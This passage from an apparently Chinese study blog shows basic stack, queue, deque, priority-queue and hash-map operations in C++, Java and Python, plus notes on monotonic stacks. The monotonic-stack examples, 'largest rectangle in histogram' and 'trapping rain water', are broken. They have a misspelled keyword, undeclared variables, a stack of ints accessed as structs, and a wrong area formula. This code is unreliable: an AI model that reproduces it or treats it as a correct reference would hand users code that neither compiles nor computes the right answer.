反转当前节点的指针,重新指向   1 -&gt; null<br>            last = head;                   // 更新last为当前节点<br>            head = nextHead;               // 继续处理下一个节点<br>        &#125;<br>        return last;                       // 返回新头节点<br>    &#125;<br></code></pre></td></tr></table></figure><h1 id="三-单调栈"><a href="#三-单调栈" class="headerlink" title="三.单调栈"></a>三.单调栈</h1><pre><code class="hljs"> C++实现</code></pre><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// C++实现</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stack&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;queue&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;deque&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-comment">// 栈</span><br>    std::cout &lt;&lt; <span class="hljs-string">&quot;C++ 实现\n&quot;</span> &lt;&lt; std::endl;<br><br>    std::cout &lt;&lt; <span class="hljs-string">&quot;栈操作（Stack）：&quot;</span> &lt;&lt; std::endl;<br>    std::stack&lt;<span class="hljs-type">int</span>&gt; stack;<br>    stack.<span class="hljs-built_in">push</span>(<span class="hljs-number">1</span>);  <span class="hljs-comment">// 压栈</span><br>    stack.<span class="hljs-built_in">push</span>(<span class="hljs-number">2</span>);<br>    stack.<span class="hljs-built_in">push</span>(<span class="hljs-number">3</span>);<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;Stack after pushes: &quot;</span>;<br>    std::stack&lt;<span class="hljs-type">int</span>&gt; tempStack = stack;<br>    <span class="hljs-keyword">while</span> (!tempStack.<span class="hljs-built_in">empty</span>()) &#123;<br>        std::cout &lt;&lt; tempStack.<span class="hljs-built_in">top</span>() &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>        tempStack.<span class="hljs-built_in">pop</span>();<br>    &#125;<br>    std::cout &lt;&lt; std::endl;<br><br>    <span class="hljs-type">int</span> top = stack.<span class="hljs-built_in">top</span>();  <span class="hljs-comment">// 获取栈顶元素</span><br>    stack.<span class="hljs-built_in">pop</span>();  <span class="hljs-comment">// 出栈</span><br>    std::cout &lt;&lt; <span class="hljs-string">&quot;Popped element: &quot;</span> &lt;&lt; top &lt;&lt; std::endl;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;Stack after pop: &quot;</span>;<br>    tempStack = stack;<br>    <span class="hljs-keyword">while</span> (!tempStack.<span class="hljs-built_in">empty</span>()) &#123;<br>        std::cout &lt;&lt; tempStack.<span class="hljs-built_in">top</span>() &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>        tempStack.<span class="hljs-built_in">pop</span>();<br>    &#125;<br>    std::cout &lt;&lt; std::endl;<br><br>    <span class="hljs-comment">// 队列</span><br>    std::cout &lt;&lt; <span class="hljs-string">&quot;\n队列操作（Queue）：&quot;</span> &lt;&lt; std::endl;<br>    std::queue&lt;<span class="hljs-type">int</span>&gt; queue;<br>    queue.<span class="hljs-built_in">push</span>(<span class="hljs-number">1</span>);  <span class="hljs-comment">// 入队</span><br>    queue.<span class="hljs-built_in">push</span>(<span class="hljs-number">2</span>);<br>    queue.<span class="hljs-built_in">push</span>(<span class="hljs-number">3</span>);<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;Queue after enqueues: &quot;</span>;<br>    std::queue&lt;<span class="hljs-type">int</span>&gt; tempQueue = queue;<br>    <span class="hljs-keyword">while</span> (!tempQueue.<span class="hljs-built_in">empty</span>()) &#123;<br>        std::cout &lt;&lt; tempQueue.<span class="hljs-built_in">front</span>() &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>        tempQueue.<span class="hljs-built_in">pop</span>();<br>    &#125;<br>    std::cout &lt;&lt; std::endl;<br><br>    <span class="hljs-type">int</span> front = queue.<span class="hljs-built_in">front</span>();  <span class="hljs-comment">// 获取队首元素</span><br>    queue.<span class="hljs-built_in">pop</span>();  <span class="hljs-comment">// 出队</span><br>    std::cout &lt;&lt; <span class="hljs-string">&quot;Dequeued element: &quot;</span> &lt;&lt; front &lt;&lt; std::endl;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;Queue after dequeue: &quot;</span>;<br>    tempQueue = queue;<br>    <span class="hljs-keyword">while</span> (!tempQueue.<span class="hljs-built_in">empty</span>()) &#123;<br>        std::cout &lt;&lt; tempQueue.<span class="hljs-built_in">front</span>() &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>        tempQueue.<span class="hljs-built_in">pop</span>();<br>    &#125;<br>    std::cout &lt;&lt; std::endl;<br><br>    <span class="hljs-comment">// 双端队列</span><br>    std::cout &lt;&lt; <span class="hljs-string">&quot;\n双端队列操作（Deque）：&quot;</span> &lt;&lt; std::endl;<br>    std::deque&lt;<span class="hljs-type">int</span>&gt; deque;<br>    deque.<span class="hljs-built_in">push_back</span>(<span class="hljs-number">1</span>);  <span class="hljs-comment">// 在尾部添加</span><br>    deque.<span class="hljs-built_in">push_front</span>(<span class="hljs-number">0</span>);  <span class="hljs-comment">// 在头部添加</span><br>    std::cout &lt;&lt; <span class="hljs-string">&quot;Deque after additions: &quot;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> n : deque) &#123;<br>        std::cout &lt;&lt; n &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>    &#125;<br>    std::cout &lt;&lt; std::endl;<br><br>    <span class="hljs-type">int</span> last = deque.<span class="hljs-built_in">back</span>();  <span class="hljs-comment">// 获取尾部元素</span><br>    deque.<span class="hljs-built_in">pop_back</span>();  <span class="hljs-comment">// 从尾部移除</span><br>    <span class="hljs-type">int</span> first = deque.<span class="hljs-built_in">front</span>();  <span class="hljs-comment">// 获取头部元素</span><br>    deque.<span class="hljs-built_in">pop_front</span>();  <span class="hljs-comment">// 从头部移除</span><br>    std::cout &lt;&lt; <span class="hljs-string">&quot;Deque after removals: &quot;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> n : deque) &#123;<br>        std::cout &lt;&lt; n &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>    &#125;<br>    std::cout &lt;&lt; std::endl;<br><br>    <span class="hljs-comment">// 优先队列</span><br>    std::cout &lt;&lt; <span class="hljs-string">&quot;\n优先队列操作（Priority Queue）：&quot;</span> &lt;&lt; std::endl;<br>    std::priority_queue&lt;<span class="hljs-type">int</span>, std::vector&lt;<span class="hljs-type">int</span>&gt;, std::greater&lt;<span class="hljs-type">int</span>&gt;&gt; pq;<br>    pq.<span class="hljs-built_in">push</span>(<span class="hljs-number">3</span>);  <span class="hljs-comment">// 入队</span><br>    pq.<span class="hljs-built_in">push</span>(<span class="hljs-number">1</span>);<br>    pq.<span class="hljs-built_in">push</span>(<span class="hljs-number">2</span>);<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;Priority Queue elements: &quot;</span>;<br>    std::priority_queue&lt;<span class="hljs-type">int</span>, std::vector&lt;<span class="hljs-type">int</span>&gt;, std::greater&lt;<span class="hljs-type">int</span>&gt;&gt; tempPQ = pq;<br>    <span class="hljs-keyword">while</span> (!tempPQ.<span class="hljs-built_in">empty</span>()) &#123;<br>        std::cout &lt;&lt; tempPQ.<span class="hljs-built_in">top</span>() &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>        tempPQ.<span class="hljs-built_in">pop</span>();<br>    &#125;<br>    std::cout &lt;&lt; std::endl;<br><br>    <span class="hljs-keyword">while</span> (!pq.<span class="hljs-built_in">empty</span>()) &#123;<br>        std::cout &lt;&lt; pq.<span class="hljs-built_in">top</span>() &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;  <span class="hljs-comment">// 按优先级顺序出队</span><br>        pq.<span class="hljs-built_in">pop</span>();<br>    &#125;<br>    std::cout &lt;&lt; std::endl;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>java的操作</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-comment">// Java实现</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">java2</span> &#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">String</span>[] args)</span> </span>&#123;<br>        <span class="hljs-comment">// 栈</span><br>        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">&quot;Java 实现\n&quot;</span>);<br><br>        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">&quot;栈操作（Stack）：&quot;</span>);<br>        java.util.Stack&lt;Integer&gt; stack = <span class="hljs-keyword">new</span> java.util.Stack&lt;&gt;();<br>        stack.<span class="hljs-built_in">push</span>(<span class="hljs-number">1</span>);  <span class="hljs-comment">// 压栈</span><br>        stack.<span class="hljs-built_in">push</span>(<span class="hljs-number">2</span>);<br>        stack.<span class="hljs-built_in">push</span>(<span class="hljs-number">3</span>);<br>        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">&quot;Stack after pushes: &quot;</span> + stack);<br>        <span class="hljs-type">int</span> top = stack.<span class="hljs-built_in">pop</span>();  <span class="hljs-comment">// 出栈</span><br>        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">&quot;Popped element: &quot;</span> + top);<br>        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">&quot;Stack after pop: &quot;</span> + stack);<br><br>        <span class="hljs-comment">// 队列</span><br>        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">&quot;\n队列操作（Queue）：&quot;</span>);<br>        java.util.Queue&lt;Integer&gt; queue = <span class="hljs-keyword">new</span> java.util.LinkedList&lt;&gt;();<br>        queue.<span class="hljs-built_in">add</span>(<span class="hljs-number">1</span>);  <span class="hljs-comment">// 入队</span><br>        queue.<span class="hljs-built_in">add</span>(<span class="hljs-number">2</span>);<br>        queue.<span class="hljs-built_in">add</span>(<span class="hljs-number">3</span>);<br>        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">&quot;Queue after enqueues: &quot;</span> + queue);<br>        <span class="hljs-type">int</span> front = queue.<span class="hljs-built_in">poll</span>();  <span class="hljs-comment">// 出队</span><br>        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">&quot;Dequeued element: &quot;</span> + front);<br>        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">&quot;Queue after dequeue: &quot;</span> + queue);<br><br>        <span class="hljs-comment">// 双端队列</span><br>        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">&quot;\n双端队列操作（Deque）：&quot;</span>);<br>        java.util.Deque&lt;Integer&gt; deque = <span class="hljs-keyword">new</span> java.util.LinkedList&lt;&gt;();<br>        deque.<span class="hljs-built_in">addLast</span>(<span class="hljs-number">1</span>);  <span class="hljs-comment">// 在尾部添加</span><br>        deque.<span class="hljs-built_in">addFirst</span>(<span class="hljs-number">0</span>);  <span class="hljs-comment">// 在头部添加</span><br>        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">&quot;Deque after additions: &quot;</span> + deque);<br>        <span class="hljs-type">int</span> last = deque.<span class="hljs-built_in">removeLast</span>();  <span class="hljs-comment">// 从尾部移除</span><br>        <span class="hljs-type">int</span> first = deque.<span class="hljs-built_in">removeFirst</span>();  <span class="hljs-comment">// 从头部移除</span><br>        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">&quot;Deque after removals: &quot;</span> + deque);<br><br>        <span class="hljs-comment">// 优先队列</span><br>        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">&quot;\n优先队列操作（Priority Queue）：&quot;</span>);<br>        java.util.PriorityQueue&lt;Integer&gt; pq = <span class="hljs-keyword">new</span> java.util.PriorityQueue&lt;&gt;();<br>        pq.<span class="hljs-built_in">add</span>(<span class="hljs-number">3</span>);  <span class="hljs-comment">// 入队</span><br>        pq.<span class="hljs-built_in">add</span>(<span class="hljs-number">1</span>);<br>        pq.<span class="hljs-built_in">add</span>(<span class="hljs-number">2</span>);<br>        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">&quot;Priority Queue elements: &quot;</span> + pq);<br>        <span class="hljs-keyword">while</span> (!pq.<span class="hljs-built_in">isEmpty</span>()) &#123;<br>            System.out.<span class="hljs-built_in">println</span>(pq.<span class="hljs-built_in">poll</span>());  <span class="hljs-comment">// 按优先级顺序出队</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>py的操作</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># Python实现</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Python 实现&quot;</span>)<br><br><span class="hljs-comment"># 栈</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n栈操作（Stack）：&quot;</span>)<br>stack = []<br>stack.append(1)  # 压栈<br>stack.append(2)<br>stack.append(3)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Stack after pushes:&quot;</span>, stack)<br>top = stack.pop()  # 出栈<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Popped element:&quot;</span>, top)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Stack after pop:&quot;</span>, stack)<br><br><span class="hljs-comment"># 队列</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n队列操作（Queue）：&quot;</span>)<br><span class="hljs-keyword">from</span> collections import deque<span class="hljs-built_in"></span><br><span class="hljs-built_in">queue </span>= deque()<br>queue.append(1)  # 入队<br>queue.append(2)<br>queue.append(3)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Queue after enqueues:&quot;</span>, queue)<br>front = queue.popleft()  # 出队<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Dequeued element:&quot;</span>, front)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Queue after dequeue:&quot;</span>, queue)<br><br><span class="hljs-comment"># 双端队列</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n双端队列操作（Deque）：&quot;</span>)<br>deque = deque()<br>deque.append(1)  # 在尾部添加<br>deque.appendleft(0)  # 在头部添加<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Deque after additions:&quot;</span>, deque)<br>last = deque.pop()  # 从尾部移除<br>first = deque.popleft()  # 从头部移除<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Deque after removals:&quot;</span>, deque)<br><br><span class="hljs-comment"># 优先队列</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n优先队列操作（Priority Queue）：&quot;</span>)<br>import<span class="hljs-built_in"> queue</span><br><span class="hljs-built_in"></span>pq = queue.PriorityQueue()<br>pq.put((2, <span class="hljs-string">&quot;B&quot;</span>))  # 入队<br>pq.put((1, <span class="hljs-string">&quot;A&quot;</span>))<br>pq.put((3, <span class="hljs-string">&quot;C&quot;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Priority Queue elements:&quot;</span>, pq.queue)<br><span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> pq.empty():<br>    <span class="hljs-built_in">print</span>(pq.<span class="hljs-built_in">get</span>())  # 按优先级顺序出队<br></code></pre></td></tr></table></figure><p>经验</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs arduino">核心思想:单调栈考虑前面不影响后面<br>套路模版: <br><span class="hljs-keyword">for</span>()&#123;<br><span class="hljs-keyword">while</span>(栈顶与新元素不满足单调栈)&#123;<br>弹栈<br>更新<br>累加<br>&#125;<br>&#125;<br><br><br><br>例子<br>柱状图中最大矩形<br>heighs=[<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">6</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>] <br><span class="hljs-keyword">private</span>:<br>stuct UERT&#123;<br><span class="hljs-type">int</span> width;<br><span class="hljs-type">int</span> height;<br>&#125;;<br>stack &lt;UERT&gt; s;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">largestRectangleArea</span><span class="hljs-params">(std::vector&lt;<span class="hljs-type">int</span>&gt;&amp; heights)</span> </span>&#123;<br>    <span class="hljs-type">int</span> res = <span class="hljs-number">0</span>;<br>    heights.<span class="hljs-built_in">push_back</span>(<span class="hljs-number">0</span>);  <span class="hljs-comment">// 便于最后清空栈</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> height:heights) &#123;<br>    <span class="hljs-type">int</span> accmulatedWidth = <span class="hljs-number">0</span>;<br>            <span class="hljs-comment">// 如果当前柱子的高度小于栈顶柱子的高度，则计算面积</span><br>            <span class="hljs-keyword">while</span> (!s.<span class="hljs-built_in">empty</span>() &amp;&amp; s.<span class="hljs-built_in">top</span>().height &gt;= height) &#123;<br>                accmulatedWidth += s.<span class="hljs-built_in">top</span>().width;<br>                ans = <span class="hljs-built_in">max</span>(ans,s.<span class="hljs-built_in">top</span>().width*accmulatedWidth);            <br>                s.<span class="hljs-built_in">pop</span>();            <br>        &#125;<br>        s.<span class="hljs-built_in">push</span>(i);  <span class="hljs-comment">// 将当前柱子的索引压入栈</span><br>   &#125;<br>    <span class="hljs-keyword">return</span> maxArea;<br>&#125;<br><br><br><br>接雨水<br><span class="hljs-keyword">private</span>:<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">UERT</span>&#123;<br><span class="hljs-type">int</span> width;<br><span class="hljs-type">int</span> height;<br>&#125;;<br>stack &lt;UERT&gt; s;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">trap</span><span class="hljs-params">(std::vector&lt;<span class="hljs-type">int</span>&gt;&amp; heights)</span> </span>&#123;<br>    std::stack&lt;<span class="hljs-type">int</span>&gt; s;  <span class="hljs-comment">// 用来保存柱子的索引</span><br>    <span class="hljs-type">int</span> water = <span class="hljs-number">0</span>;  <span class="hljs-comment">// 保存总的接雨水量</span><br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> height:heights) &#123;<br>   <span class="hljs-type">int</span> accmulatedWidth = <span class="hljs-number">0</span>;<br>        <span class="hljs-comment">// 如果当前柱子的高度大于栈顶柱子，计算能存储的雨水</span><br>        <span class="hljs-keyword">while</span> (!s.<span class="hljs-built_in">empty</span>() &amp;&amp; s.<span class="hljs-built_in">top</span>().height &lt;= height) &#123;<br>            <span class="hljs-type">int</span> bottom = s.<span class="hljs-built_in">top</span>().height;<br>            accmulatedWidth += s.<span class="hljs-built_in">top</span>().width;<br>            s.<span class="hljs-built_in">pop</span>();<br>            <span class="hljs-keyword">if</span> (s.<span class="hljs-built_in">empty</span>()) <span class="hljs-keyword">continue</span>;  <span class="hljs-comment">// 如果栈为空，跳过</span><br>            <span class="hljs-type">int</span> up = <span class="hljs-built_in">min</span>(height,s.<span class="hljs-built_in">top</span>().height);<br>            ans += accmulatedWidth*(up-bottom);<br>        &#125;<br>        s.<span class="hljs-built_in">push</span>(&#123;accmulatedWidth<span class="hljs-number">+1</span>,height&#125;);  <span class="hljs-comment">// 将当前柱子的索引压入栈</span><br>    &#125;<br><br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><h1 id="四-单调队列"><a href="#四-单调队列" class="headerlink" title="四.单调队列"></a>四.单调队列</h1><h1 id="五-集合和映射"><a href="#五-集合和映射" class="headerlink" title="五. 集合和映射"></a>五. 集合和映射</h1><p>C++实现</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unordered_map&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unordered_set&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;C++ 实现\n&quot;</span> &lt;&lt; std::endl;<br><br>    <span class="hljs-comment">// 哈希表（unordered_map）</span><br>    std::cout &lt;&lt; <span class="hljs-string">&quot;哈希表操作（unordered_map）：&quot;</span> &lt;&lt; std::endl;<br>    std::unordered_map&lt;std::string, <span class="hljs-type">int</span>&gt; hashMap;<br>    hashMap[<span class="hljs-string">&quot;a&quot;</span>] = <span class="hljs-number">1</span>;<br>    hashMap[<span class="hljs-string">&quot;b&quot;</span>] = <span class="hljs-number">2</span>;<br>    hashMap[<span class="hljs-string">&quot;c&quot;</span>] = <span class="hljs-number">3</span>;<br><br>    <span class="hljs-comment">// 添加元素</span><br>    hashMap[<span class="hljs-string">&quot;d&quot;</span>] = <span class="hljs-number">4</span>;<br><br>    <span class="hljs-comment">// 访问元素</span><br>    std::cout &lt;&lt; <span class="hljs-string">&quot;Value for key &#x27;a&#x27;: &quot;</span> &lt;&lt; hashMap[<span class="hljs-string">&quot;a&quot;</span>] &lt;&lt; std::endl;<br><br>    <span class="hljs-comment">// 修改元素</span><br>    hashMap[<span class="hljs-string">&quot;a&quot;</span>] = <span class="hljs-number">10</span>;<br><br>    <span class="hljs-comment">// 删除元素</span><br>    hashMap.<span class="hljs-built_in">erase</span>(<span class="hljs-string">&quot;b&quot;</span>);<br><br>    <span class="hljs-comment">// 遍历哈希表</span><br>    std::cout &lt;&lt; <span class="hljs-string">&quot;Hash table elements:&quot;</span> &lt;&lt; std::endl;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; pair : hashMap) &#123;<br>        std::cout &lt;&lt; pair.first &lt;&lt; <span class="hljs-string">&quot; &quot;</span> &lt;&lt; pair.second &lt;&lt; std::endl;<br>    &#125;<br><br>    <span class="hljs-comment">// 检查键是否存在</span><br>    std::cout &lt;&lt; <span class="hljs-string">&quot;Key &#x27;c&#x27; in 